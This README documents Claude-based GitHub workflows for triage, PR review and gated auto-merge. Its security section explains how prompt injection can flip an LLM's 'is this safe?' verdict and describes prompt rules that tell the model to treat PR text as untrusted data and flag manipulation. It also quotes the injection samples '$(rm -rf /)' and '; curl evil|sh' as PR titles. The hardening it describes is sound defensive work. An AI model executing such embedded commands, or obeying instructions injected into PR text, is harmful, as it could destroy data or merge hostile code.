# Claude automation for this repo

Three workflows let Claude help triage and review, with conservative, opt-in merging.

| Workflow | Trigger | What it does | Merges? |
|---|---|---|---|
| `claude-triage.yml` | issue opened; `@claude` in an issue/PR comment | Triage comment + labels on new issues; answers `@claude` mentions (read-only + comment) | No |
| `claude-pr-review.yml` | PR opened/updated | Reviews **same-repo** PRs, posts a verdict + `claude-safe`/`claude-flagged`; labels fork PRs `external-pr` (no review, no secrets) | No |
| `claude-automerge.yml` | PR labeled; CI completed | **Opt-in.** Squash-merges only when every gate below passes | Yes, gated |

## One-time setup (required)

The workflows authenticate with a **Claude Code OAuth token** (subscription auth),
set as the repo secret `CLAUDE_CODE_OAUTH_TOKEN`. Generating it needs a one-time
interactive browser login that only the account owner can complete:

```bash
claude setup-token                 # opens a browser; prints a long-lived token
gh secret set CLAUDE_CODE_OAUTH_TOKEN --repo <owner>/<repo>   # paste the token
```

Or run `/install-github-app` from Claude Code, which walks through the GitHub App
install and sets the token for you.

Prefer an API key instead? Set `gh secret set ANTHROPIC_API_KEY ...` and change the
two workflows' auth input to `anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}`.

Without a token the review/triage jobs no-op; the fork-labeler and the auto-merge gate still run.

## Security model — read before enabling auto-merge

**The LLM verdict is not the security boundary.** Prompt injection can flip an LLM's
"is this safe?" answer, and Anthropic's own guidance is that human review should gate
merges. So `claude-safe` is only *one* of several gates, and the real boundary is the
non-LLM ones. Auto-merge (`claude-automerge.yml`) runs **only** when ALL of:

1. **Opt-in is on** — repo variable `CLAUDE_AUTOMERGE=on` (default off; the whole job is skipped otherwise). Enable with `gh variable set CLAUDE_AUTOMERGE --body on`.
2. **Author already has write/maintain/admin access** — external / fork / first-time contributors can never trigger it (this is the load-bearing gate: someone who could merge by hand anyway).
3. **Not a fork PR, open, not draft, no conflicts.**
4. **`claude-safe` label present and no blocking label** (`claude-flagged`, `needs-human-review`, `do-not-merge`, `wip`).
5. **No sensitive paths touched** — never auto-merges changes under `.github/`, `src-tauri/`, `packaging/`, `scripts/`, anything matching `crypto|sign|keystore|secret`, or dependency manifests (`package.json`, `pnpm-lock.yaml`, `Cargo.toml/lock`). Those always require a human.
6. **All CI checks green.**

### Prompt- and command-injection hardening

- PR/issue/comment text is treated as **untrusted data** in every prompt; the prompts tell Claude to ignore embedded instructions and to *flag* manipulation attempts rather than obey them.
- The action strips HTML comments, zero-width characters, hidden attributes, and image alt-text before Claude sees the content.
- In workflow shell steps, untrusted values (titles, bodies, branch names, usernames) are passed **only via `env:`** and quoted — never interpolated into a `run:` script — so a PR titled `` $(rm -rf /) `` or `; curl evil|sh` cannot execute.
- Fork PRs never run Claude with the API key or execute their code; a maintainer can review one on demand with `@claude review` (the action gates that on the commenter's write access).
- Tool access is allow-listed per workflow (read + specific `gh` verbs), so Claude can't push, merge, or run arbitrary commands even if a prompt tried to make it.

### Recommendation

Leave `CLAUDE_AUTOMERGE` **off** while the contributor base is small — the review + label
+ triage already remove most of the toil, and merging stays a one-click human action on a
green, `claude-safe` PR. Turn it on only for a trusted set of collaborators, and keep the
sensitive-path list broad. To pin supply-chain risk further, replace `@v1` on the action
with a full commit SHA.
